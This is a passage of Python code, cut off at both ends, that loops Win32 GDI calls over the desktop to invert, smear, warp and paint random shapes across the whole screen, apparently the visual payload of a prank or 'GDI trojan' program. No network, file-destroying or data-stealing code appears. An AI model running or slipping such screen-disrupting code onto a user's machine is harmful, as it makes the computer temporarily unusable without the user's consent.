    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCERASE)

for i in range(70):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(30):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, DSTINVERT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCAND)

for i in range(40):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)
for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCERASE)

for i in range(0,10):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    DeleteObject(brush)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCERASE)

points = ((40, 10), (x, -50), (90, y))
for i in range(100):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)
    
for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

points = ((40, 10), (x, -30), (90, y))
for i in range(100):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(30):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, DSTINVERT)

points = ((40, 10), (x, -99), (90, y))
for i in range(10):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(10):
    StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)

points = ((10, 60), (x, -39), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

points = ((70, 30), (x, -59), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCAND)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(90):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCERASE)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(0,20):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(0,15):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
    DeleteObject(brush)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(0,6):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    DeleteObject(brush)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(0,4):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,0,180,SRCAND)
    BitBlt(desk,10,10,w,h,desk,0,90,SRCPAINT)
    BitBlt(desk,10,10,w,h,desk,180,0,SRCAND)
    BitBlt(desk,10,10,w,h,desk,90,0,SRCPAINT)
    DeleteObject(brush)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCERASE)

for i in range(200):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(desk, brush)
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), DSTINVERT)
    
points = ((50, 93), (x, -39), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(10000):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(hdc, brush)
    Pie(hdc, randrange(1,x),randrange(1,y),randrange(1,x),randrange(1,y), randrange(1,x),randrange(1,y), randrange(1,x),randrange(1,y) )

for i in range(200):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(desk, brush)
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATCOPY)

for i in range(20):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(40):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(0,15):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
    DeleteObject(brush)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCERASE)
    
for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

points = ((40, 10), (x, -99), (90, y))
for i in range(90):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(30):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(70):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(90):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCCOPY)

for i in range(100):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCERASE)

points = ((10, 60), (x, -39), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

points = ((40, 60), (x, -10), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(500):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(hdc, brush)
    Pie(hdc, randrange(1,x),randrange(1,y),randrange(1,x),randrange(1,y), randrange(1,x),randrange(1,y), randrange(1,x),randrange(1,y) )

points = ((10, 60), (x, -39), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

points = ((40, 60), (x, -10), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

points = ((70, 30), (x, -59), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(80):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

for i in range(60):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, DSTINVERT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

points = ((70, 30), (x, -59), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(5):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCERASE)
    
for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)
for i in range(10):
    BitBlt(desk, -20, -30, sw, sh, desk, 0, 0, SRCCOPY)
for i in range(30):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(0,20):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,24,12,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    BitBlt(desk,10,10,w,h,desk,12,12,SRCCOPY)
    BitBlt(desk,10,100,w,h,desk,12,12,SRCAND)
    BitBlt(desk,100,100,w,h,desk,12,12,SRCAND)
    DeleteObject(brush)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

points = ((10, 60), (x, -39), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(10):
    StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCERASE)

for i in range(40):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -5, -5, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(40):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 5, 5, sw, sh, desk, 0, 0, SRCCOPY)
    BitBlt(desk, -80, -30, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

points = ((10, 60), (x, -39), (50, y))
for i in range(30):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(10):
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCCOPY)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCERASE)

points = ((40, 10), (x, -99), (90, y))
for i in range(40):
    PlgBlt(hdc, points, hdc, 0, 0, x, y, None, 0, 0)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for i in range(200):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(desk, brush)
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATCOPY)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(10):
    StretchBlt(HDC, 50, 50, sw - 100, sh - 100, HDC, 0, 0, sw, sh, SRCCOPY)

for i in range(40):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, NOTSRCERASE)
    
for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGEPAINT)

for i in range(0,15):
    brush = CreateSolidBrush(RGB(
        randrange(255),
        randrange(255),
        randrange(255),
        ))
    SelectObject(desk,brush)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,0,0,x,y,PATINVERT)
    BitBlt(desk,10,10,w,h,desk,-255,-20,SRCCOPY)
    StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
    StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY)
    DeleteObject(brush)

for i in range(100):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, MERGECOPY)

for x in range(0, 500):
        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)

        y = GetSystemMetrics(SM_CXMAXTRACK)
        x = GetSystemMetrics(SM_CXSCREEN)

        BitBlt(desk, randint(0, 50), randint(0, 30), randint(0, x), randint(0, x), desk, randint(0, 30), randint(0, 20), SRCCOPY)

        Sleep(0)
        ReleaseDC(hwnd, hdc)

for i in range(200):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(desk, brush)
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATCOPY)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(200):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(desk, brush)
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATCOPY)

for x in range(0, 100):
        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)

        y = GetSystemMetrics(SM_CXMAXTRACK)
        x = GetSystemMetrics(SM_CXSCREEN)

        BitBlt(desk, randint(0, 0), randint(0, 0), randint(0, x), randint(0, x), desk, randint(0, 65), randint(0, 90), SRCCOPY)

        Sleep(0)
        ReleaseDC(hwnd, hdc)

for i in range(200):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(desk, brush)
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATCOPY)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCCOPY)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)
    
for x in range(0, 700):
        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)

        y = GetSystemMetrics(SM_CXMAXTRACK)
        x = GetSystemMetrics(SM_CXSCREEN)

        BitBlt(desk, randint(0, 0), randint(0, 0), randint(0, x), randint(0, x), desk, randint(0, 30), randint(0, 10), SRCCOPY)

        Sleep(0)
        ReleaseDC(hwnd, hdc)
        
for i in range(200):
    brush = CreateSolidBrush(RGB(

        randrange(255), randrange(255), randrange(255)

    ))
    SelectObject(desk, brush)
    PatBlt(desk, randrange(x), randrange(y), randrange(x), randrange(y), PATCOPY)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)
    
for x in range(0, 500):
        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)

        y = GetSystemMetrics(SM_CXMAXTRACK)
        x = GetSystemMetrics(SM_CXSCREEN)

        BitBlt(desk, randint(0, 0), randint(0, 0), randint(0, x), randint(0, x), desk, randint(0, 80), randint(0, 40), SRCCOPY)

        Sleep(0)
        ReleaseDC(hwnd, hdc)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for x in range(0, 500):
        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)

        y = GetSystemMetrics(SM_CXMAXTRACK)
        x = GetSystemMetrics(SM_CXSCREEN)

        BitBlt(desk, randint(0, 20), randint(0, 12), randint(0, x), randint(0, x), desk, randint(0, 91), randint(0, 851), PATCOPY)

        Sleep(0)
        ReleaseDC(hwnd, hdc)

for i in range(10):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for x in range(0, 600):
        hwnd = GetDesktopWindow()
        hdc = GetWindowDC(hwnd)

        y = GetSystemMetrics(SM_CXMAXTRACK)
        x = GetSystemMetrics(SM_CXSCREEN)

        BitBlt(desk, randint(0, 700), randint(0, 800), randint(0, x), randint(0, x), desk, randint(0, 300), randint(0, 400), SRCCOPY)

        Sleep(0)
        ReleaseDC(hwnd, hdc)

for i in range(0, 100):
        StretchBlt(desk, n, n, ScrW - n * 2, ScrH - n * 2, desk, 0, 0, ScrW, ScrH, SRCCOPY)
        if n < ScrW: n += 12
        if n > ScrW: n = 4

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(10):
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(10):
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCPAINT)

for i in range(20):
    BitBlt(desk, 1, 1, sw, sh, desk, 0, 0, SRCINVERT)

for i in range(10):
    StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, 0x9999999)

for i in range(0,9):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    BitBlt(desk, -800, -300, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,200,500,w,h,desk,0,180,SRCAND)

for i in range(0,9):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),WHITENESS)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
    PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),BLACKNESS)
    BitBlt(desk, -800, -300, sw, sh, desk, 0, 0, MERGECOPY)
    BitBlt(desk,200,500,w,h,desk,0,180,SRCAND)

for i in range(0,9):
    brush = CreateSolidBrush(RGB(
    randrange(255),
    randrange(255),
    randrange(255),
    ))
